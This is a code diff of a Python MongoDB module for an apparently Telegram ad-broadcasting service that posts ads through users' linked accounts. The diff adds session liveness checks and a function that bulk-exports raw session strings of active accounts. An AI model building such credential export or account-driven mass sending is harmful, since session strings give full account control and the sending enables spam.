@@ -15,8 +15,6 @@ from config import (
 )
 from Nexa.logs import info, warn, error
 
-# ---------------------------------------------------------------- state
-
 mongo_client = None
 db = None
 db_connected = False
@@ -66,8 +64,6 @@ _CFG_DEFAULTS = {
 }
 
 
-# ---------------------------------------------------------------- helpers
-
 def _as_bool(value, default=False):
     if isinstance(value, bool):
         return value
@@ -95,7 +91,6 @@ def _default_config():
 
 
 def _normalize_ad(ad):
-    """Migrate every historical ad shape into the current text-link shape."""
     ad = dict(ad or {})
     if not ad.get("id"):
         ad["id"] = uuid.uuid4().hex[:8]
@@ -121,7 +116,6 @@ def _normalize_ad(ad):
 
 
 def _ensure_indexes():
-    """Never raises - a bad index must not tear down a live connection."""
     try:
         if users_col is not None:
             users_col.create_index([("phone", ASCENDING)])
@@ -130,6 +124,8 @@ def _ensure_indexes():
             users_col.create_index([("next_ad_time", ASCENDING)])
             users_col.create_index([("ads_enabled", ASCENDING),
                                     ("next_ad_time", ASCENDING)])
+            users_col.create_index([("status", ASCENDING)])
+            users_col.create_index([("last_check", ASCENDING)])
             users_col.create_index([("created_at", DESCENDING)])
         if temp_sessions_col is not None:
             temp_sessions_col.create_index([("created_at", ASCENDING)])
@@ -156,8 +152,6 @@ def _unbind():
     users_col = ads_config_col = temp_sessions_col = None
     ads_logs_col = broadcast_msgs_col = None
 
-
-# ---------------------------------------------------------------- connect
 
 def _connect():
     global mongo_client, db, db_connected, _last_ping
@@ -193,7 +187,6 @@ def _connect():
             database = client[DB_NAME]
             client.admin.command("ping")
 
-            # Only publish the new state once the connection is proven good.
             mongo_client = client
             db = database
             _bind(database)
@@ -242,7 +235,6 @@ def init_db():
 
 
 def ping():
-    """Force a live round-trip. Returns True/False."""
     global _last_ping
     if mongo_client is None:
         return _connect()
@@ -257,8 +249,6 @@ def ping():
 def is_connected():
     return bool(db_connected and mongo_client is not None)
 
-
-# ---------------------------------------------------------------- accessors
 
 def get_users_col():          return users_col
 def get_ads_config_col():     return ads_config_col
@@ -278,8 +268,6 @@ def db_status():
     }
 
 
-# ---------------------------------------------------------------- files
-
 def allowed_file(filename):
     return bool(filename) and "." in filename and \
         filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT
@@ -297,7 +285,6 @@ def media_kind(filename):
 
 
 def media_exists(path):
-    """True if the file is reachable at any plausible location."""
     if not path or not isinstance(path, str):
         return False
     base = os.path.basename(path)
@@ -312,7 +299,6 @@ def media_exists(path):
 
 
 def delete_photo_file(path):
-    """Delete the media file at every plausible location."""
     if not path or not isinstance(path, str):
         return
     base = os.path.basename(path)
@@ -328,11 +314,7 @@ def escape_text(value):
     return _html.escape(value or "", quote=False)
 
 
-# ---------------------------------------------------------------- sessions
-
 def save_session_to_db(session_data):
-    """Upsert a linked account. A brand new account gets its first ad after
-    exactly one interval, then repeats on that interval."""
     if not ensure_db() or users_col is None:
         return False
     try:
@@ -340,6 +322,7 @@ def save_session_to_db(session_data):
         interval = max(60, interval)
         now = datetime.now()
         phone = session_data["phone"]
+        status = session_data.get("status") or "active"
         payload = {
             "session_string": session_data["session_string"],
             "updated_at": now,
@@ -347,7 +330,9 @@ def save_session_to_db(session_data):
             "username": session_data.get("username"),
             "first_name": session_data.get("first_name", ""),
             "last_name": session_data.get("last_name", ""),
-            "status": "active",
+            "status": status,
+            "last_check": now,
+            "check_fail": session_data.get("check_fail"),
         }
 
         existing = users_col.find_one({"phone": phone})
@@ -384,8 +369,27 @@ def save_session_to_db(session_data):
         return False
 
 
+def record_check(phone, ok, err=None):
+    if not phone or not ensure_db() or users_col is None:
+        return False
+    try:
+        if ok:
+            users_col.update_one(
+                {"phone": phone},
+                {"$set": {"status": "active", "last_check": datetime.now(),
+                          "check_fail": None}})
+        else:
+            users_col.update_one(
+                {"phone": phone},
+                {"$set": {"status": "dead", "ads_enabled": False,
+                          "last_check": datetime.now(),
+                          "check_fail": (err or "unknown")[:120]}})
+        return True
+    except PyMongoError:
+        return False
+
+
 def backfill_next_ad_time():
-    """Anyone missing a schedule becomes due immediately, once."""
     if not ensure_db() or users_col is None:
         return 0
     try:
@@ -420,8 +424,6 @@ def reschedule_all_after_interval_change(interval_sec):
 
 
 def pull_schedule_forward(max_wait_sec=90, new_wait_sec=30):
-    """After a content change, pull pending sends forward so the next tick
-    picks it up instead of waiting a whole interval."""
     if not ensure_db() or users_col is None:
         return 0
     try:
@@ -438,7 +440,6 @@ def pull_schedule_forward(max_wait_sec=90, new_wait_sec=30):
 
 
 def queue_all_now():
-    """Make every subscribed user due right now."""
     if not ensure_db() or users_col is None:
         return 0
     try:
@@ -497,15 +498,13 @@ def mark_user_expired(oid):
         return False
     try:
         users_col.update_one({"_id": oid},
-                             {"$set": {"ads_enabled": False, "status": "expired"}})
+                             {"$set": {"ads_enabled": False, "status": "dead"}})
         return True
     except PyMongoError:
         return False
 
 
 def add_bad_peers(oid, chat_ids):
-    """Remember chats that fail with a permanent peer error so later rounds
-    skip them instead of hammering Telegram."""
     if not chat_ids or not ensure_db() or users_col is None:
         return 0
     clean = [c for c in chat_ids if isinstance(c, (int, str))]
@@ -530,8 +529,6 @@ def clear_bad_peers(oid):
     except PyMongoError:
         return False
 
-
-# ---------------------------------------------------------------- counters
 
 def count_users():
     if not ensure_db() or users_col is None:
@@ -572,14 +569,10 @@ def count_pending_messages():
                  0, "count_pending_messages")
 
 
-# ---------------------------------------------------------------- config
-
 def get_ads_config():
     if not ensure_db() or ads_config_col is None:
         return _default_config()
     try:
-        # Atomic create-and-return: no read-then-write race, and _id stays out
-        # of $setOnInsert so there is no field conflict.
         doc = _default_config()
         doc.pop("_id", None)
         config = ads_config_col.find_one_and_update(
@@ -594,7 +587,6 @@ def get_ads_config():
         for key, value in _CFG_DEFAULTS.items():
             config.setdefault(key, value)
 
-        # Coerce types so callers can trust them.
         config["ads_enabled"] = _as_bool(config.get("ads_enabled"), False)
         config["caption_is_html"] = _as_bool(config.get("caption_is_html"), False)
         config["delete_after_round"] = _as_bool(config.get("delete_after_round"), True)
@@ -633,7 +625,6 @@ def get_ads_config():
 
 
 def update_ads_config(updates):
-    """Write config fields and report whether the write actually landed."""
     if not ensure_db() or ads_config_col is None:
         return False
     updates = dict(updates)
@@ -668,7 +659,6 @@ def inc_ads_config(field, amount=1):
 
 
 def set_delete_after_round(enabled):
-    """Verified setter. Returns the persisted value, or None on failure."""
     if not update_ads_config({"delete_after_round": bool(enabled)}):
         return None
     return _as_bool((get_ads_config() or {}).get("delete_after_round"), True)
@@ -679,7 +669,6 @@ def get_delete_after_round():
 
 
 def get_auto_logout():
-    """(enabled, hours) for the 24h auto logout feature."""
     config = get_ads_config() or {}
     enabled = _as_bool(config.get("auto_logout_enabled"), False)
     try:
@@ -700,7 +689,6 @@ def set_auto_logout(enabled, hours=None):
 
 
 def mutate_ads(mutator):
-    """Atomic read-modify-write of the ads array."""
     with _config_lock:
         config = get_ads_config()
         ads = [_normalize_ad(a) for a in config.get("ads", [])]
@@ -735,8 +723,6 @@ def reset_ads_config():
     return old_media if ok else None
 
 
-# ---------------------------------------------------------------- videos
-
 def get_videos():
     config = get_ads_config()
     vids = config.get("videos") or []
@@ -762,8 +748,6 @@ def update_videos(videos):
     return update_ads_config({"videos": normalized})
 
 
-# ---------------------------------------------------------------- stats
-
 def get_stats():
     empty = {
         "total_users": 0, "active_users": 0, "idle_users": 0,
@@ -772,7 +756,7 @@ def get_stats():
         "online_users": 0, "recent_users": 0,
         "last_broadcast_at": None, "next_broadcast_at": None,
         "broadcast_mode_users": 0, "registered_today": 0,
-        "users_without_session": 0, "due_now": 0,
+        "users_without_session": 0, "due_now": 0, "dead_users": 0,
     }
     if not ensure_db() or users_col is None:
         return empty
@@ -780,6 +764,7 @@ def get_stats():
         total = users_col.count_documents({})
         active = users_col.count_documents({"status": "active"})
         idle = users_col.count_documents({"status": "idle"})
+        dead = users_col.count_documents({"status": "dead"})
         opted_in = users_col.count_documents({"ads_enabled": True})
 
         agg = list(users_col.aggregate([{
@@ -809,6 +794,7 @@ def get_stats():
             "total_users": total,
             "active_users": active,
             "idle_users": idle,
+            "dead_users": dead,
             "opted_in": opted_in,
             "total_deliveries": deliveries,
             "total_broadcasts": config.get("total_broadcasts", 0),
@@ -839,6 +825,7 @@ def get_all_users(limit=500):
             ca = user.get("created_at")
             la = user.get("last_ad_time")
             na = user.get("next_ad_time")
+            lc = user.get("last_check")
             output.append({
                 "id": str(user.get("_id")),
                 "user_id": user.get("user_id"),
@@ -851,6 +838,8 @@ def get_all_users(limit=500):
                 "deliveries": user.get("deliveries", 0),
                 "failures": user.get("failures", 0),
                 "bad_peers": len(user.get("bad_peers") or []),
+                "check_fail": user.get("check_fail"),
+                "last_check": lc.strftime("%Y-%m-%d %H:%M") if isinstance(lc, datetime) else "Never",
                 "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
                 "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
                 "next_ad_time": na.strftime("%Y-%m-%d %H:%M") if isinstance(na, datetime) else "N/A",
@@ -861,19 +850,24 @@ def get_all_users(limit=500):
         return []
 
 
-def export_user_sessions(limit=1000):
-    """Raw session material for the admin ZIP export."""
+def get_active_sessions_for_export(limit=1000, only_active=True):
     if not ensure_db() or users_col is None:
         return []
     try:
+        query = {"session_string": {"$nin": [None, ""]}}
+        if only_active:
+            query["status"] = "active"
+            query["ads_enabled"] = True
         out = []
         cursor = users_col.find(
-            {"session_string": {"$nin": [None, ""]}},
+            query,
             {"phone": 1, "user_id": 1, "username": 1, "status": 1,
-             "session_string": 1, "created_at": 1, "ads_enabled": 1},
+             "session_string": 1, "created_at": 1, "ads_enabled": 1,
+             "last_check": 1, "check_fail": 1},
         ).limit(limit)
         for u in cursor:
             ca = u.get("created_at")
+            lc = u.get("last_check")
             out.append({
                 "phone": u.get("phone") or "",
                 "user_id": u.get("user_id"),
@@ -881,11 +875,33 @@ def export_user_sessions(limit=1000):
                 "status": u.get("status") or "unknown",
                 "ads_enabled": bool(u.get("ads_enabled", False)),
                 "created_at": ca.isoformat() if isinstance(ca, datetime) else None,
+                "last_check": lc.isoformat() if isinstance(lc, datetime) else None,
+                "check_fail": u.get("check_fail"),
                 "session_string": u.get("session_string") or "",
             })
         return out
     except PyMongoError as exc:
-        warn(f"export_user_sessions failed: {exc}", source="db")
+        warn(f"get_active_sessions_for_export failed: {exc}", source="db")
+        return []
+
+
+def get_sessions_due_for_check(limit=5, max_age_min=10):
+    if not ensure_db() or users_col is None:
+        return []
+    try:
+        cutoff = datetime.now() - timedelta(minutes=max_age_min)
+        cursor = users_col.find({
+            "session_string": {"$nin": [None, ""]},
+            "ads_enabled": True,
+            "status": {"$ne": "dead"},
+            "$or": [{"last_check": {"$exists": False}},
+                    {"last_check": None},
+                    {"last_check": {"$lt": cutoff}}],
+        }).sort("last_check", ASCENDING).limit(limit)
+        return [{"phone": u.get("phone"), "session_string": u.get("session_string")}
+                for u in cursor]
+    except PyMongoError as exc:
+        warn(f"get_sessions_due_for_check failed: {exc}", source="db")
         return []
 
 
@@ -900,8 +916,6 @@ def clear_broadcast_messages():
         warn(f"clear_broadcast_messages failed: {exc}", source="db")
         return 0
 
-
-# ---------------------------------------------------------------- telegram
 
 def send_to_channel(message):
     if not BOT_TOKEN:
